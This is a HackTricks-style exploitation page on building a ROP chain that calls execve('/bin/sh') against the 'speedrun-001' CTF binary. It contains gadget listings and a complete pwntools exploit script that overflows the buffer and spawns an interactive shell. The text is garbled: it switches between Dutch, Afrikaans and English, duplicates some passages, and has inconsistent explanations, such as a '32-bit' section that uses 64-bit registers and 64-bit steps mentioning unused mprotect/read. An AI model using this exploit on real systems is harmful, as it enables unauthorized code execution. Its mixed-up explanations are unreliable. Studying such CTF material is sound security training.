# ROP - roep sys_execve aan

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**offici√´le PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

Om de oproep voor de **syscall** voor te bereiden, is de volgende configuratie nodig:

* `rax: 59 Specificeer sys_execve`
* `rdi: ptr naar "/bin/sh" specificeer het uit te voeren bestand`
* `rsi: 0 specificeer dat er geen argumenten worden doorgegeven`
* `rdx: 0 specificeer dat er geen omgevingsvariabelen worden doorgegeven`

Dus, in feite is het nodig om de string `/bin/sh` ergens te schrijven en vervolgens de `syscall` uit te voeren (met inachtneming van de padding die nodig is om de stack te controleren).

## Beheer de registers

Laten we beginnen met het vinden van **hoe we die registers kunnen beheersen**:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Met hierdie adresse is dit moontlik om die inhoud in die stoor te skryf en dit in die registre te laai.

## Skryf string

### Skryfbare geheue

Eerstens moet jy 'n skryfbare plek in die geheue vind.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Skryf String

Dan moet jy 'n manier vind om willekeurige inhoud op hierdie adres te skryf
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32-bits

##### ROP (Return Oriented Programming)

ROP is a technique used in exploitation to bypass security measures like DEP (Data Execution Prevention) and ASLR (Address Space Layout Randomization). It involves chaining together small pieces of code, known as gadgets, to perform malicious actions.

##### Syscall

A syscall is a way for a program to request services from the operating system. In Linux, syscalls are identified by a number, and the parameters for the syscall are passed in registers.

##### Execv

The execv syscall is used to execute a program in Linux. It takes two arguments: the path to the program and an array of strings representing the program's arguments.

##### ROP + Syscall + Execv

To execute a program using ROP, we need to find gadgets that perform the necessary syscalls and set the appropriate registers. We can then chain these gadgets together to create a ROP chain that calls execv with the desired program and arguments.

##### Example

Here is an example of a ROP chain that calls execv to execute the "/bin/sh" program:

1. Find gadgets that set the registers for the execv syscall.
2. Find a gadget that sets the EAX register to the syscall number for execv.
3. Find a gadget that sets the EBX register to the address of the "/bin/sh" string.
4. Find a gadget that sets the ECX register to the address of the argument array.
5. Find a gadget that sets the EDX register to 0 (no environment variables).
6. Find a gadget that performs the syscall instruction.
7. Chain these gadgets together in the correct order, setting the registers and performing the syscall.

By carefully constructing the ROP chain, we can execute arbitrary programs with arbitrary arguments, giving us full control over the system.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64-bits

##### ROP + Syscall + execv

Hierdie tegniek maak gebruik van Return-Oriented Programming (ROP) in kombinasie met die Syscall-instruksie en die execv-sisteemoproep om 'n uitvoerbare l√™er uit te voer op 'n 64-bits Linux-stelsel.

##### Stap 1: Identifiseer die funksies

Eerstens moet ons die funksies identifiseer wat ons sal gebruik in ons ROP-ketting. Ons het die volgende funksies nodig:

- `mprotect`: Hierdie funksie sal ons toelaat om die uitvoerbare geheuegebied te verander na lees-, skryf- en uitvoerbare (rwx) toestand.
- `read`: Hierdie funksie sal ons toelaat om die uitvoerbare l√™er in die geheue te lees.
- `execve`: Hierdie funksie sal ons toelaat om die uitvoerbare l√™er uit te voer.

##### Stap 2: Bou die ROP-ketting

Ons sal die volgende stappe volg om die ROP-ketting te bou:

1. Kry die adres van die `mprotect`-funksie in die geheue.
2. Kry die adres van die `read`-funksie in die geheue.
3. Kry die adres van die `execve`-funksie in die geheue.
4. Kry die adres van die uitvoerbare l√™er in die geheue.
5. Bou die ROP-ketting deur die funksie-adresse en die nodige argumente in die regte volgorde te stapel.

##### Stap 3: Voer die ROP-ketting uit

Nadat die ROP-ketting gebou is, kan ons dit uitvoer deur die Syscall-instruksie te gebruik. Hier is die stappe wat ons moet volg:

1. Stel die regsiters korrek in vir die Syscall-instruksie.
2. Voer die Syscall-instruksie uit.

##### Stap 4: Verifieer die uitvoering

Om te verseker dat die uitvoering suksesvol was, kan ons die uitvoer van die uitvoerbare l√™er monitor.

Met hierdie tegniek kan ons 'n uitvoerbare l√™er uitvoer op 'n 64-bits Linux-stelsel deur gebruik te maak van ROP, die Syscall-instruksie en die execv-sisteemoproep.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Voorbeeld

In this example, we will use a basic ROP (Return-Oriented Programming) technique to execute the `execv` system call in a Linux environment.

In hierdie voorbeeld sal ons 'n basiese ROP (Return-Oriented Programming) tegniek gebruik om die `execv` stelseloproep in 'n Linux omgewing uit te voer.

First, we need to find the addresses of the gadgets we will use in our ROP chain. We can use tools like `ROPgadget` or `ropper` to search for gadgets in the binary.

Eerstens moet ons die adresse van die gadgets wat ons in ons ROP-ketting sal gebruik, vind. Ons kan gereedskap soos `ROPgadget` of `ropper` gebruik om gadgets in die bin√™re l√™er te soek.

Once we have the addresses, we can start building our ROP chain. The ROP chain will consist of the addresses of the gadgets we want to use, followed by the arguments for the `execv` system call.

Sodra ons die adresse het, kan ons begin om ons ROP-ketting te bou. Die ROP-ketting sal bestaan uit die adresse van die gadgets wat ons wil gebruik, gevolg deur die argumente vir die `execv` stelseloproep.

We will need gadgets that perform the following actions:
1. Load the address of the `/bin/sh` string into a register.
2. Load the address of the `execv` function into a register.
3. Load the arguments for the `execv` function into registers.
4. Call the `execv` function.

Ons sal gadgets benodig wat die volgende aksies uitvoer:
1. Laai die adres van die `/bin/sh` string in 'n register.
2. Laai die adres van die `execv` funksie in 'n register.
3. Laai die argumente vir die `execv` funksie in registers.
4. Roep die `execv` funksie aan.

Once we have our ROP chain, we can trigger the vulnerability to execute our ROP chain and ultimately the `execv` system call.

Sodra ons ons ROP-ketting het, kan ons die kwesbaarheid aktiveer om ons ROP-ketting en uiteindelik die `execv` stelseloproep uit te voer.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Verwysings

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
